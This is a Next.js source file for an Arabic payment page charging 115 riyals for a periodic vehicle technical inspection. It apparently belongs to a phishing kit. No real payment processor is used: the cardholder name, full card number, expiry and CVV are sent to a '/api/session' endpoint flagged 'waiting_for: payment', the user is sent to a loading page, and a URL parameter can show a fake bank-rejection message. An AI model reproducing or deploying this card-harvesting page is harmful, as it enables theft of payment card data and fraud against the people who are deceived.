"use client";
export const dynamic = 'force-dynamic';
import { useState, useEffect, useRef } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import SessionTracker from "@/components/SessionTracker";

const GREEN = "#1e7344";

// ===== خوارزمية Luhn =====
function luhnCheck(cardNum: string): boolean {
  const digits = cardNum.replace(/\s/g, "");
  if (!/^\d{13,19}$/.test(digits)) return false;
  let sum = 0;
  let shouldDouble = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
}

// ===== التحقق من تاريخ الانتهاء =====
function validateExpiry(expiry: string): { valid: boolean; msg: string } {
  const clean = expiry.replace(/\s/g, "");
  const match = clean.match(/^(\d{2})\/?(\d{2})$/);
  if (!match) return { valid: false, msg: "صيغة التاريخ غير صحيحة (MM/YY)" };
  const month = parseInt(match[1], 10);
  const year = parseInt("20" + match[2], 10);
  if (month < 1 || month > 12) return { valid: false, msg: "الشهر يجب أن يكون بين 01 و 12" };
  const now = new Date();
  const expDate = new Date(year, month, 0);
  if (expDate < now) return { valid: false, msg: "البطاقة منتهية الصلاحية" };
  return { valid: true, msg: "" };
}

type BinInfo = {
  scheme?: string;
  type?: string;
  brand?: string;
  bank?: { name?: string };
  country?: { name?: string; emoji?: string; alpha2?: string };
  valid: boolean;
  checked: boolean;
  error?: string;
};

// ألوان البنوك حسب اسم البنك
function getBankGradient(bankName?: string, scheme?: string): string {
  if (!bankName) {
    if (scheme === "visa") return "linear-gradient(135deg, #1a1f71 0%, #0d1147 100%)";
    if (scheme === "mastercard") return "linear-gradient(135deg, #eb001b 0%, #f79e1b 100%)";
    if (scheme === "amex") return "linear-gradient(135deg, #007bc1 0%, #004f80 100%)";
    return "linear-gradient(135deg, #1e7344 0%, #114126 100%)";
  }
  const name = bankName.toLowerCase();
  // بنوك سعودية
  if (name.includes("al rajhi") || name.includes("الراجحي")) return "linear-gradient(135deg, #006633 0%, #004422 100%)";
  if (name.includes("national") || name.includes("الأهلي")) return "linear-gradient(135deg, #c8102e 0%, #8b0a1e 100%)";
  if (name.includes("riyad") || name.includes("الرياض")) return "linear-gradient(135deg, #004b87 0%, #002d52 100%)";
  if (name.includes("samba") || name.includes("سامبا")) return "linear-gradient(135deg, #e31837 0%, #9b0f25 100%)";
  if (name.includes("saudi british") || name.includes("sabb") || name.includes("سابك")) return "linear-gradient(135deg, #db0011 0%, #8b0009 100%)";
  if (name.includes("arab national") || name.includes("العربي الوطني")) return "linear-gradient(135deg, #006b3f 0%, #004428 100%)";
  if (name.includes("banque saudi fransi") || name.includes("الفرنسي")) return "linear-gradient(135deg, #003087 0%, #001a4d 100%)";
  if (name.includes("alinma") || name.includes("الإنماء")) return "linear-gradient(135deg, #00843d 0%, #005228 100%)";
  if (name.includes("gulf") || name.includes("الخليج")) return "linear-gradient(135deg, #0066b3 0%, #003d6b 100%)";
  // بنوك إماراتية
  if (name.includes("emirates nbd") || name.includes("إمارات")) return "linear-gradient(135deg, #c8102e 0%, #8b0a1e 100%)";
  if (name.includes("mashreq") || name.includes("مشرق")) return "linear-gradient(135deg, #e2001a 0%, #9b0011 100%)";
  if (name.includes("adcb") || name.includes("أبوظبي")) return "linear-gradient(135deg, #e31837 0%, #9b0f25 100%)";
  if (name.includes("fab") || name.includes("first abu dhabi")) return "linear-gradient(135deg, #009a44 0%, #006b2f 100%)";
  // بنوك عالمية
  if (name.includes("hsbc")) return "linear-gradient(135deg, #db0011 0%, #8b0009 100%)";
  if (name.includes("citibank") || name.includes("citi")) return "linear-gradient(135deg, #003b70 0%, #001f3d 100%)";
  if (name.includes("standard chartered")) return "linear-gradient(135deg, #0072aa 0%, #004a6e 100%)";
  if (name.includes("barclays")) return "linear-gradient(135deg, #00aeef 0%, #0077a3 100%)";
  if (name.includes("chase") || name.includes("jpmorgan")) return "linear-gradient(135deg, #005eb8 0%, #003d7a 100%)";
  if (name.includes("bank of america")) return "linear-gradient(135deg, #e31837 0%, #9b0f25 100%)";
  // افتراضي حسب نوع البطاقة
  if (scheme === "visa") return "linear-gradient(135deg, #1a1f71 0%, #0d1147 100%)";
  if (scheme === "mastercard") return "linear-gradient(135deg, #1a1a2e 0%, #16213e 100%)";
  if (scheme === "amex") return "linear-gradient(135deg, #007bc1 0%, #004f80 100%)";
  return "linear-gradient(135deg, #2c3e50 0%, #1a252f 100%)";
}

export default function PaymentPage() {
  const router = useRouter();
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [errorMsg, setErrorMsg] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  // أخطاء الحقول
  const [cardNumberError, setCardNumberError] = useState("");
  const [expiryError, setExpiryError] = useState("");
  const [cvvError, setCvvError] = useState("");
  const [cardHolderError, setCardHolderError] = useState("");

  // معلومات BIN من API
  const [binInfo, setBinInfo] = useState<BinInfo>({ valid: false, checked: false });
  const [binLoading, setBinLoading] = useState(false);
  const binTimerRef = useRef<NodeJS.Timeout | null>(null);

  const searchParams = useSearchParams();

  useEffect(() => {
    const rejected = searchParams.get("rejected");
    if (rejected === "1") {
      setErrorMsg("تم رفض العملية من قبل البنك مصدر البطاقة");
    }
  }, [searchParams]);

  function formatCardNumber(val: string) {
    const digits = val.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(.{4})/g, "$1 ").trim();
  }

  function formatExpiry(val: string) {
    const digits = val.replace(/\D/g, "").slice(0, 4);
    if (digits.length >= 3) return digits.slice(0, 2) + " / " + digits.slice(2);
    return digits;
  }

  function getCardType(num: string) {
    const n = num.replace(/\s/g, "");
    if (n.startsWith("4")) return "visa";
    if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return "mastercard";
    if (/^3[47]/.test(n)) return "amex";
    return null;
  }

  // استدعاء Binlist API للتحقق من BIN
  async function checkBin(bin: string) {
    if (bin.length < 6) {
      setBinInfo({ valid: false, checked: false });
      return;
    }
    setBinLoading(true);
    try {
      const res = await fetch(`https://lookup.binlist.net/${bin}`, {
        headers: { "Accept-Version": "3" },
      });
      if (res.status === 404 || res.status === 422) {
        setBinInfo({ valid: false, checked: true, error: "رقم البطاقة غير معروف أو غير صالح" });
        setBinLoading(false);
        return;
      }
      if (!res.ok) {
        // إذا فشل الـ API نعتمد على Luhn فقط
        setBinInfo({ valid: false, checked: false });
        setBinLoading(false);
        return;
      }
      const data = await res.json();
      // إذا كانت الاستجابة فارغة (BIN غير موجود)
      if (!data.scheme && !data.type && !data.brand && !data.bank?.name) {
        setBinInfo({ valid: false, checked: true, error: "رقم البطاقة غير صالح أو غير مدعوم" });
      } else {
        setBinInfo({
          valid: true,
          checked: true,
          scheme: data.scheme,
          type: data.type,
          brand: data.brand,
          bank: data.bank,
          country: data.country,
        });
      }
    } catch {
      // إذا فشل الاتصال نعتمد على Luhn فقط
      setBinInfo({ valid: false, checked: false });
    }
    setBinLoading(false);
  }

  // عند تغيير رقم البطاقة
  function handleCardNumberChange(val: string) {
    const formatted = formatCardNumber(val);
    setCardNumber(formatted);
    setCardNumberError("");
    setBinInfo({ valid: false, checked: false });

    const digits = formatted.replace(/\s/g, "");
    if (binTimerRef.current) clearTimeout(binTimerRef.current);
    if (digits.length >= 6) {
      binTimerRef.current = setTimeout(() => {
        checkBin(digits.slice(0, 8));
      }, 600);
    }
  }

  function onCardNumberBlur() {
    const digits = cardNumber.replace(/\s/g, "");
    if (!digits) { setCardNumberError(""); return; }
    if (digits.length < 13) {
      setCardNumberError("رقم البطاقة قصير جداً");
      return;
    }
    if (!luhnCheck(cardNumber)) {
      setCardNumberError("رقم البطاقة غير صالح - يرجى التحقق من الأرقام");
      setBinInfo({ valid: false, checked: true, error: "رقم البطاقة غير صالح" });
      return;
    }
    setCardNumberError("");
  }

  function onExpiryBlur() {
    const clean = expiry.replace(/\s/g, "");
    if (!clean) { setExpiryError(""); return; }
    const result = validateExpiry(expiry);
    setExpiryError(result.valid ? "" : result.msg);
  }

  function onCvvBlur() {
    if (!cvv) { setCvvError(""); return; }
    if (cvv.length < 3) setCvvError("رمز CVV يجب أن يكون 3 أرقام على الأقل");
    else setCvvError("");
  }

  async function handleSubmit() {
    let hasError = false;

    if (!cardHolder.trim()) {
      setCardHolderError("يرجى إدخال اسم حامل البطاقة");
      hasError = true;
    } else {
      setCardHolderError("");
    }

    const digits = cardNumber.replace(/\s/g, "");
    if (!digits) {
      setCardNumberError("يرجى إدخال رقم البطاقة");
      hasError = true;
    } else if (digits.length < 13) {
      setCardNumberError("رقم البطاقة قصير جداً");
      hasError = true;
    } else if (!luhnCheck(cardNumber)) {
      setCardNumberError("رقم البطاقة غير صالح - يرجى التحقق من الأرقام");
      hasError = true;
    } else if (binInfo.checked && !binInfo.valid) {
      setCardNumberError(binInfo.error || "رقم البطاقة غير صالح");
      hasError = true;
    } else {
      setCardNumberError("");
    }

    if (!expiry) {
      setExpiryError("يرجى إدخال تاريخ الانتهاء");
      hasError = true;
    } else {
      const expiryResult = validateExpiry(expiry);
      if (!expiryResult.valid) {
        setExpiryError(expiryResult.msg);
        hasError = true;
      } else {
        setExpiryError("");
      }
    }

    if (!cvv) {
      setCvvError("يرجى إدخال رمز CVV");
      hasError = true;
    } else if (cvv.length < 3) {
      setCvvError("رمز CVV يجب أن يكون 3 أرقام");
      hasError = true;
    } else {
      setCvvError("");
    }

    if (hasError) return;

    setIsSubmitting(true);
    setErrorMsg("");
    try {
      await fetch('/api/session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          current_page: 'payment',
          card_holder: cardHolder,
          card_number: cardNumber,
          card_expiry: expiry,
          card_cvv: cvv,
          waiting_for: 'payment',
        }),
      });
    } catch {}
    router.push("/loading-page?from=payment");
  }

  const cardType = getCardType(cardNumber);
  const displayNumber = cardNumber || "#### #### #### ####";
  const digits = cardNumber.replace(/\s/g, "");
  const luhnValid = digits.length >= 13 && luhnCheck(cardNumber);

  // لون البطاقة الديناميكي حسب البنك
  const cardGradient = getBankGradient(
    binInfo.valid ? binInfo.bank?.name : undefined,
    binInfo.valid ? binInfo.scheme : cardType || undefined
  );

  const inputStyle = (hasError: boolean) => ({
    width: "100%",
    padding: "13px",
    border: `1.5px solid ${hasError ? "#e74c3c" : "#e0e0e0"}`,
    borderRadius: "10px",
    fontSize: "15px",
    outline: "none",
    fontFamily: "inherit",
    transition: "border-color 0.2s",
    boxSizing: "border-box" as const,
    backgroundColor: hasError ? "#fff8f8" : "white",
  });

  return (
    <div style={{ backgroundColor: "#f7f8fa", display: "flex", justifyContent: "center", alignItems: "center", minHeight: "100vh", padding: "20px" }}>
      <SessionTracker page="payment" />
      <div style={{ background: "#fff", width: "100%", maxWidth: "420px", borderRadius: "25px", padding: "25px 20px", boxShadow: "0 10px 30px rgba(0,0,0,0.08)", textAlign: "center" }}>

        {/* رسالة الرفض من البنك */}
        {errorMsg && (
          <div style={{
            backgroundColor: "#fff0f0", border: "1px solid #e74c3c",
            borderRadius: "10px", padding: "12px 16px", marginBottom: "18px",
            color: "#e74c3c", fontSize: "14px", fontWeight: "bold", textAlign: "center",
          }}>
            ❌ {errorMsg}
          </div>
        )}

        <div style={{ marginBottom: "20px" }}>
          <h1 style={{ fontSize: "18px", color: "#333", marginBottom: "5px" }}>إتمام عملية الدفع</h1>
          <p style={{ fontSize: "14px", color: GREEN, fontWeight: "bold" }}>بقيمة 115 ريال - خدمة الفحص الفني الدوري</p>
        </div>

        {/* Card Visual - لون ديناميكي حسب البنك */}
        <div style={{
          width: "100%", height: "200px",
          background: cardGradient,
          borderRadius: "15px", padding: "20px", marginBottom: "20px",
          color: "white", position: "relative", boxShadow: "0 8px 20px rgba(0,0,0,0.25)",
          direction: "ltr", textAlign: "left", overflow: "hidden",
          transition: "background 0.6s ease",
        }}>
          {/* خطوط زخرفية خفية */}
          <div style={{ position: "absolute", top: "-30px", right: "-30px", width: "160px", height: "160px", borderRadius: "50%", background: "rgba(255,255,255,0.05)" }} />
          <div style={{ position: "absolute", bottom: "-40px", left: "-20px", width: "120px", height: "120px", borderRadius: "50%", background: "rgba(255,255,255,0.04)" }} />

          {/* صف الأعلى: شريحة البطاقة + لوجو البطاقة */}
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", height: "40px" }}>
            <div style={{ width: "45px", height: "35px", background: "linear-gradient(135deg, #f0d060 0%, #b88a14 100%)", borderRadius: "6px", boxShadow: "0 2px 6px rgba(0,0,0,0.3)" }} />
            {/* لوجو نوع البطاقة */}
            {(cardType === "visa" || binInfo.scheme === "visa") && (
              <span style={{ fontSize: "24px", fontWeight: "900", fontStyle: "italic", color: "#fff", letterSpacing: "2px", textShadow: "0 2px 4px rgba(0,0,0,0.3)" }}>VISA</span>
            )}
            {(cardType === "mastercard" || binInfo.scheme === "mastercard") && (
              <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                <div style={{ display: "flex" }}>
                  <div style={{ width: "28px", height: "28px", borderRadius: "50%", background: "#eb001b" }} />
                  <div style={{ width: "28px", height: "28px", borderRadius: "50%", background: "#f79e1b", marginLeft: "-12px" }} />
                </div>
                <span style={{ fontSize: "9px", color: "#fff", fontWeight: "bold", marginLeft: "4px", opacity: 0.9 }}>mastercard</span>
              </div>
            )}
            {(cardType === "amex" || binInfo.scheme === "amex") && (
              <span style={{ fontSize: "14px", fontWeight: "900", color: "#fff", letterSpacing: "1px", background: "rgba(255,255,255,0.2)", padding: "4px 8px", borderRadius: "4px" }}>AMEX</span>
            )}
          </div>

          {/* اسم البنك إذا توفر */}
          {binInfo.valid && binInfo.bank?.name && (
            <div style={{ fontSize: "10px", color: "rgba(255,255,255,0.7)", marginTop: "4px", letterSpacing: "0.5px", textTransform: "uppercase" }}>
              {binInfo.bank.name}
            </div>
          )}

          {/* رقم البطاقة */}
          <div style={{ fontSize: "18px", letterSpacing: "3px", marginTop: binInfo.valid && binInfo.bank?.name ? "10px" : "22px", fontFamily: "Courier New, monospace", whiteSpace: "nowrap", textShadow: "0 1px 3px rgba(0,0,0,0.3)" }}>
            {displayNumber}
          </div>

          {/* اسم الحامل والتاريخ */}
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-end", marginTop: "16px", direction: "rtl" }}>
            <div style={{ fontSize: "13px", textAlign: "right", maxWidth: "190px", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", textShadow: "0 1px 2px rgba(0,0,0,0.2)" }}>
              {cardHolder || "اسم حامل البطاقة"}
            </div>
            <div style={{ textAlign: "left" }}>
              <div style={{ fontSize: "9px", color: "rgba(255,255,255,0.6)", marginBottom: "2px" }}>VALID THRU</div>
              <div style={{ fontSize: "14px", direction: "ltr", textShadow: "0 1px 2px rgba(0,0,0,0.2)" }}>{expiry || "00 / 00"}</div>
            </div>
          </div>
        </div>

        {/* معلومات البنك من Binlist API */}
        {binLoading && (
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "8px", padding: "8px 12px", background: "#f0f7f4", borderRadius: "8px", marginBottom: "14px", fontSize: "13px", color: "#666" }}>
            <span style={{ display: "inline-block", width: "14px", height: "14px", border: "2px solid #1e7344", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.8s linear infinite" }} />
            جارٍ التحقق من البطاقة...
          </div>
        )}
        {!binLoading && binInfo.checked && binInfo.valid && (
          <div style={{
            background: "#f0faf4", border: "1px solid #b8e0c8",
            borderRadius: "10px", padding: "10px 14px", marginBottom: "14px",
            textAlign: "right", fontSize: "13px",
          }}>
            <div style={{ display: "flex", alignItems: "center", gap: "6px", marginBottom: "4px" }}>
              <span style={{ color: GREEN, fontWeight: "bold", fontSize: "14px" }}>✅ بطاقة صالحة</span>
            </div>
            {binInfo.bank?.name && <div style={{ color: "#555" }}>🏦 البنك: <strong>{binInfo.bank.name}</strong></div>}
            {binInfo.country?.name && (
              <div style={{ color: "#555" }}>
                🌍 الدولة: <strong>{binInfo.country.emoji} {binInfo.country.name}</strong>
              </div>
            )}
            {binInfo.scheme && <div style={{ color: "#555" }}>💳 النوع: <strong>{binInfo.scheme?.toUpperCase()} {binInfo.type}</strong></div>}
          </div>
        )}
        {!binLoading && binInfo.checked && !binInfo.valid && (
          <div style={{
            background: "#fff0f0", border: "1px solid #f5c6c6",
            borderRadius: "10px", padding: "10px 14px", marginBottom: "14px",
            textAlign: "right", fontSize: "13px", color: "#e74c3c",
          }}>
            ❌ {binInfo.error || "رقم البطاقة غير صالح"}
          </div>
        )}

        {/* Payment Logos */}
        <div style={{ display: "flex", justifyContent: "center", marginBottom: "20px" }}>
          <img src="https://i.ibb.co/tpNdmqZz/IMG-20260312-WA0007.jpg" style={{ width: "100%", maxWidth: "280px", height: "auto" }} alt="Payment Methods" />
        </div>

        {/* Form */}
        <div style={{ textAlign: "right", marginBottom: "15px" }}>
          <label style={{ display: "block", fontSize: "13px", fontWeight: "bold", color: "#444", marginBottom: "7px" }}>اسم حامل البطاقة</label>
          <input
            type="text"
            value={cardHolder}
            onChange={e => {
              setCardHolder(e.target.value.replace(/[0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/g, ""));
              if (cardHolderError) setCardHolderError("");
            }}
            placeholder="الاسم كما هو على البطاقة"
            style={{ ...inputStyle(!!cardHolderError), textAlign: "right" }}
          />
          {cardHolderError && <p style={{ color: "#e74c3c", fontSize: "12px", marginTop: "4px", textAlign: "right" }}>⚠ {cardHolderError}</p>}
        </div>

        <div style={{ textAlign: "right", marginBottom: "15px" }}>
          <label style={{ display: "block", fontSize: "13px", fontWeight: "bold", color: "#444", marginBottom: "7px" }}>رقم البطاقة</label>
          <div style={{ position: "relative" }}>
            <input
              type="tel"
              value={cardNumber}
              onChange={e => handleCardNumberChange(e.target.value)}
              onBlur={onCardNumberBlur}
              placeholder="1234 5678 9012 3456"
              maxLength={19}
              style={{ ...inputStyle(!!cardNumberError), direction: "ltr", textAlign: "left", fontFamily: "Courier New, monospace", paddingRight: "40px" }}
            />
            {/* مؤشر صحة الرقم */}
            {digits.length >= 13 && !binLoading && (
              <span style={{ position: "absolute", left: "12px", top: "50%", transform: "translateY(-50%)", fontSize: "16px" }}>
                {luhnValid && (binInfo.checked ? (binInfo.valid ? "✅" : "❌") : "✅") ? "✅" : "❌"}
              </span>
            )}
            {binLoading && digits.length >= 6 && (
              <span style={{ position: "absolute", left: "12px", top: "50%", transform: "translateY(-50%)" }}>
                <span style={{ display: "inline-block", width: "14px", height: "14px", border: "2px solid #1e7344", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.8s linear infinite" }} />
              </span>
            )}
          </div>
          {cardNumberError && <p style={{ color: "#e74c3c", fontSize: "12px", marginTop: "4px", textAlign: "right" }}>⚠ {cardNumberError}</p>}
        </div>

        <div style={{ display: "flex", gap: "10px", marginBottom: "20px" }}>
          <div style={{ flex: 1.5, textAlign: "right" }}>
            <label style={{ display: "block", fontSize: "13px", fontWeight: "bold", color: "#444", marginBottom: "7px" }}>تاريخ الانتهاء</label>
            <input
              type="tel"
              value={expiry}
              onChange={e => {
                setExpiry(formatExpiry(e.target.value));
                if (expiryError) setExpiryError("");
              }}
              onBlur={onExpiryBlur}
              placeholder="MM / YY"
              maxLength={7}
              style={{ ...inputStyle(!!expiryError), direction: "ltr", textAlign: "left" }}
            />
            {expiryError && <p style={{ color: "#e74c3c", fontSize: "11px", marginTop: "4px", textAlign: "right" }}>⚠ {expiryError}</p>}
          </div>
          <div style={{ flex: 1, textAlign: "right" }}>
            <label style={{ display: "block", fontSize: "13px", fontWeight: "bold", color: "#444", marginBottom: "7px" }}>رمز (CVV)</label>
            <input
              type="tel"
              value={cvv}
              onChange={e => {
                setCvv(e.target.value.replace(/\D/g, "").slice(0, 4));
                if (cvvError) setCvvError("");
              }}
              onBlur={onCvvBlur}
              placeholder="123"
              maxLength={4}
              style={{ ...inputStyle(!!cvvError), direction: "ltr", textAlign: "left" }}
            />
            {cvvError && <p style={{ color: "#e74c3c", fontSize: "11px", marginTop: "4px", textAlign: "right" }}>⚠ {cvvError}</p>}
          </div>
        </div>

        <button
          onClick={handleSubmit}
          disabled={isSubmitting}
          style={{
            width: "100%",
            backgroundColor: isSubmitting ? "#aaa" : "#82b199",
            color: "white", border: "none", borderRadius: "10px",
            padding: "16px", fontSize: "18px", fontWeight: "bold",
            cursor: isSubmitting ? "not-allowed" : "pointer",
            transition: "background 0.3s",
          }}
          onMouseEnter={e => { if (!isSubmitting) e.currentTarget.style.backgroundColor = GREEN; }}
          onMouseLeave={e => { if (!isSubmitting) e.currentTarget.style.backgroundColor = "#82b199"; }}
        >
          {isSubmitting ? "جارٍ المعالجة..." : "ادفع الآن"}
        </button>
      </div>

      <style>{`
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}
